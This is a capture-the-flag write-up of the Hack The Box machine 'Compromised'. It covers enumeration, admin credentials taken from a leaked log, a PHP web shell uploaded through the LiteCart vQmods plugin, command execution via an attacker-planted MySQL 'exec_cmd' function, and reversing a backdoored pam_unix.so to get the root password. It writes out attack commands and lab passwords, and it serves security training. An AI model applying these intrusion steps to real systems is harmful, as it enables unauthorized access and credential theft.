---
layout: post
author: Marmeus, N0xi0us, Xavilok
title: Compromised [HTB]
date: 2021-01-23 18:00:00 +/- 0000
categories: [Machine-Writeup, CTF,QR]
tags: [HTB,OSCP Path]
headline: Compromised is a virtual machine which has been “compromised” by a previous attacker so you have to follow all the attacker’s traces in order to become root. First, you will have to find some credentials which will be used to upload a web shell. Secondly, you will have to find a mysql function created by the attacker for getting a shell and the sysadmin’s credentials. Finally, you will have to reverse the “pam_unix.so” file in order to get the password to become root.
image: https://www.hackthebox.eu/storage/avatars/8cdb7b8009bb1de144e51f9c26847e69.png
---


##  Introduction

**Compromised** is a hard linux machine which has been “compromised” by a **previous attacker** so you have to follow all the attacker’s traces in order to become root. First, you will have to find some credentials which will be used to upload a web shell. Secondly, you will have to find a mysql function created by the attacker for getting a shell and the sysadmin’s credentials. Finally, you will have to reverse the “pam_unix.so” file in order to get the password to become root.

**Note**: The IP might vary depending on the screenshot, that is because
I have been solving this machine in different moments in time.

##  Enumeration

As always I start with nmap with the purpose of finding every open port in the machine.

```bash

sudo nmap -sS -p- -T5 -n 10.10.10.207 -oN AllPorts.txt

```

![](assets/img/Compromised/1000000000000361000000A01AC683635C4B9CB3.png)

Then, I continue with a port scan more in depth.

```bash

sudo nmap -sC -sV -p22,80 -n 10.10.10.207 -oN PortsInDepth.txt

```

![](assets/img/Compromised/10000000000003950000013241BFBA126109A71D.png)

Accessing to the port 80, I find this pretty shopping web page which sells rubber duckies. (My favourite is the red one jejejejeje).

![](assets/img/Compromised/10000000000004E200000387F69400D7DF82F7E4.png)

To enumerate hidden web directories I am using gobuster.

```bash
gobuster -t 20 dir -u http://10.129.12.249/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:           http://10.129.12.249/
[+] Threads:       20
[+] Wordlist:      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:  200,204,301,302,307,401,403
[+] User Agent:    gobuster/3.0.1
[+] Timeout:       10s
===============================================================
2020/09/13 10:04:46 Starting gobuster
===============================================================
/shop (Status: 301)
/backup (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/13 10:13:11 Finished
===============================================================
```

The result is a backup diretory where we kind find a compressed file.

![](assets/img/Compromised/10000000000002250000012E9B60900951FE81FD.png)

Once, extracted the file, you can find any stored password using the
following command.

```bash

grep -iR "password" . 2>/dev/null | grep -v ".js" 

```

- **-iR**: avoid case sensitive search, doing it recursively.
- ** 2>/dev/null**: avoids showing errors.
- **-v “.js”**: Avoids showing “.js” files.

Between all the results, I found a  weird log file.

![](assets/img/Compromised/10000000000004CE00000035047B764DB7B9A451.png)

Because this file wasn’t inside the backup file, I decided to look for it on the web server and it turns out that this file stores the admin credentials of the previous webpage.

![](assets/img/Compromised/10000000000002CD0000009186112411AC3E1DEC.png)

```bash
admin : theNextGenSt0r3!~
```

##  Explotation

Doing a quick search in **SearchExploit** provides you with an exploit for **LiteCart**.

![](assets/img/Compromised/100000000000033D000000A4CDEF529832473133.png)

However, it doesn’t work…

![](assets/img/Compromised/100000000000049800000028D8CF30470DDAFD1C.png)

**Note**: Despite this point I will be using the compromised.htb domain to attack the web. You can do it the same by modifying the “/etc/hosts” file like this.

![](assets/img/Compromised/100000000000024D0000008B36B8F6DAEDE9C410.png)

Searching inside the web as the admin user, there is plugin named “vQmods”.

![](assets/img/Compromised/10000000000000F200000050ED88C73056F8FEF4.png)

This plugin allows you to upload some files. For instance a web shell.

![](assets/img/Compromised/1000000000000161000000D2F81E0E9B2554A894.png)

In order to get a web shell, I used the following 
[exploit](https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html). You must add the following line in order to execute commands in the linux server.

![](assets/img/Compromised/100000000000017200000071D1848E18D983BD35.png)

Then, you need to use burpsuite to modify the headers as I show you below, so the file can be uploaded correctly.

![](assets/img/Compromised/100000000000076F000001EAF6CA6EE868ECC471.png)

As you can see, it works perfectly.

![](assets/img/Compromised/10000000000002B200000076CF860A50180F2C11.png)

Because working with the browser can be tedious and boring there is a special tool called [webwrap](https://github.com/mxrch/webwrap) which allows you to send commands to your webshell through the terminal. As you can see below.

```bash
rlwrap python3 webwrap.py
http://compromised.htb/shop/vqmod/xml/PHPexploit.php?c=WRAP

```

![](assets/img/Compromised/100000000000044200000063652F53807AD4C457.png)

Because using grep fro finding stored credentials crash the web shell, I needed to do it manually. Inside the file `/var/www/html/shop/includes/config.inc.php` are stored the MySQL
credentials.

```bash
root : changethis
```

![](assets/img/Compromised/10000000000001D2000000A851BB2B5DFE1A7AAF.png)

Furthermore, looking inside the “/etc/passwd” file I found out that youcan login with mysql user in order to get a shell.

Because the web shell doesn’t allow you to use TTY, you can only access to the mysql via the bash command line to request information about the database.

First, I checked the mysql version.

```bash
mysql -u root -p'changethis' -e "select version()"
```

![](assets/img/Compromised/100000000000033F0000004476F537F6F8FCDE4E.png)

Then, I checked any special database, despite the “LiteChart” database named “ecom”.

```bash”
mysql -u root -p'changethis' -e "show databases"
```

![](assets/img/Compromised/10000000000003340000008947614E13A325A35E.png)

After a long time, inside the `func` table which is inside the `mysql` database, there is a weird function.

![](assets/img/Compromised/100000000000034B000002224BE3B9A453C1600E.png)

This weird function is named “exec_cmd” which seems able to execute commands like the **mysql** user.

![](assets/img/Compromised/10000000000003730000004A005CD62312FC81E0.png)

This can be proved by executing the following command.  

```bash
mysql -u root -p'changethis' mysql -e "select exec_cmd('id') from mysql.func"
```

![](assets/img/Compromised/1000000000000410000000ABD3B95C115D45005B.png)

``` bash
mysql -u root -p'changethis' mysql -e "select exec_cmd('pwd') from mysql.func"
```



![](assets/img/Compromised/100000000000049D000000D90965D01FD6E806B7.png)

The `/var/lib/mysql` folder can just be accessed by the root and mysql users. Furthermore, the “exec_cmd” function is not so good so you can’t
neither list all files inside the folder or read files contests. Hence, I changed the folders permissions so other users can get access.

```bash
mysql -u root -p'changethis' mysql -e "select exec_cmd('chmod o+xwr /var/lib/mysql') from mysql.func"
```

![](assets/img/Compromised/10000000000002D400000235A1F26590088EF2A5.png)

**Strace** is a program used in program reversing in order to show all system calls executed for the program that is being executed. Hence, the `strace-log.dat` could hide some tasty information. Thus, I made a copy of the file with all permissions so I can use grep to find some redentials.

```bash
mysql -u root -p'changethis' mysql -e "select exec_cmd('cp strace-log.dat bash.txt') from mysql.func"
mysql -u root -p'changethis' mysql -e "select exec_cmd('chmod 777 bash.txt') from mysql.func"
grep password bash.txt
```

![](assets/img/Compromised/1000000000000494000000F056E9604EFDE4AD65.png)

As you can see in the previous picture we got the sysadmin credentials.

```bash
sysadmin: 3*NLJE32I$Fe
```

They can be used in SSH, getting the user flag.

![](assets/img/Compromised/10000000000002D7000000661429EFB777478679.png)

##  Privilege escalation

Using the command `dpkg –verify`, which verifies the integrity of all packages, by comparing information from the files installed by the package manager with the files metadata information stored in the dpkg database, we can see if there are any modified files.

![](assets/img/Compromised/100000000000044D0000023CA732F5344E9A0965.png)

Researching on the internet there is an article about [pam backdoors](https://github.com/zephrax/linux-pam-backdoor) showing how an attacker could replace the pam-unix file so can bypass the authentication process by writing a craftmade password and becoming root.

I transferred the file to my kali machine in order to disassemble it using [cutter](https://cutter.re/), a graphic interface for *radare*, so I can analyse the file nicely.

**Execution process**:

```bash
chmod +x Cutter-v1.12.0-x64.Linux.AppImage
./Cutter-v1.12.0-x64.Linux.AppImage
```

Filtering by “auth” I found the section `sys.pam-sm_authenticate`.

![](assets/img/Compromised/10000000000001410000006249C2D81DFD82FF07.png)

Digging inside the decompiled function there are the following strings “zlke~U3E”,
”n82m2-”, which are concatenated during the program execution. 

![](assets/img/Compromised/100000000000031C00000098518322225709DDED.png)

Trying the password `zlke~U3Env82m2-` with the command `su – root` command we become root, solving the machine.

![](assets/img/Compromised/100000000000013E00000042A3AE47EB6967D9FA.png)
